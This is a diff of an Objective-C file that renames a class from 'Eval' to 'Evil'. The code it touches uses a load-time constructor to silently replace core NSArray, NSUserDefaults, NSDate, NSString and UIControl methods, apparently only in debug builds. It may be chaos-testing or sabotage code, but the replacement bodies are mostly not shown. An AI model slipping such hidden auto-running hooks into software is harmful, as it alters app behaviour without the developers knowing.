@@ -2,7 +2,7 @@
 
 #import <objc/runtime.h>
 
-@interface Eval : NSObject
+@interface Evil : NSObject
 
 +(void) overwriteWithClass:(Class) targetClass
               withSelector:(SEL) targetSelector
@@ -10,7 +10,7 @@
         settingReplacedImp:(IMP*) settingImp;
 @end
 
-@implementation Eval
+@implementation Evil
 
 +(void) overwriteWithClass:(Class) targetClass
               withSelector:(SEL) targetSelector
@@ -103,7 +103,7 @@ static void replaced_UIControl_sendAction_to_forEvent(id self, SEL sel, SEL acti
     return orig_UIControl_sendAction_to_forEvent(self, sel, action, to, event);
 }
 
-__attribute__((constructor)) void eval_init(void) {
+__attribute__((constructor)) void evil_init(void) {
 
 #ifdef DEBUG
 #else
@@ -111,32 +111,32 @@ return;
 #endif
 
 
-    [Eval overwriteWithClass:NSArray.class
+    [Evil overwriteWithClass:NSArray.class
                 withSelector:NSSelectorFromString(@"containsObject:")
                  usingNewImp:(IMP)&replaced_NSArray_containsObject
           settingReplacedImp:(IMP *)&orig_NSArray_containsObject];
     
-    [Eval overwriteWithClass:NSUserDefaults.class
+    [Evil overwriteWithClass:NSUserDefaults.class
                 withSelector:NSSelectorFromString(@"stringForKey:")
                  usingNewImp:(IMP)&replaced_NSUserDefaults_stringForKey
           settingReplacedImp:(IMP *)&orig_NSUserDefaults_stringForKey];
     
-    [Eval overwriteWithClass:NSArray.class
+    [Evil overwriteWithClass:NSArray.class
                 withSelector:NSSelectorFromString(@"lastObject")
                  usingNewImp:(IMP)&replaced_NSArray_lastObject
           settingReplacedImp:(IMP *)&orig_NSArray_lastObject];
     
-    [Eval overwriteWithClass:NSDate.class
+    [Evil overwriteWithClass:NSDate.class
                 withSelector:NSSelectorFromString(@"timeIntervalSince1970")
                  usingNewImp:(IMP)&replaced_NSDate_timeIntervalSince1970
           settingReplacedImp:(IMP *)&orig_NSDate_timeIntervalSince1970];
     
-    [Eval overwriteWithClass:NSString.class
+    [Evil overwriteWithClass:NSString.class
                 withSelector:NSSelectorFromString(@"stringByAppendingString:")
                  usingNewImp:(IMP)&replaced_NSString_stringByAppendingString
           settingReplacedImp:(IMP *)&orig_NSString_stringByAppendingString];
     
-    [Eval overwriteWithClass:NSClassFromString(@"UIControl")
+    [Evil overwriteWithClass:NSClassFromString(@"UIControl")
                 withSelector:NSSelectorFromString(@"sendAction:to:forEvent:")
                  usingNewImp:(IMP)&replaced_UIControl_sendAction_to_forEvent
           settingReplacedImp:(IMP *)&orig_UIControl_sendAction_to_forEvent];
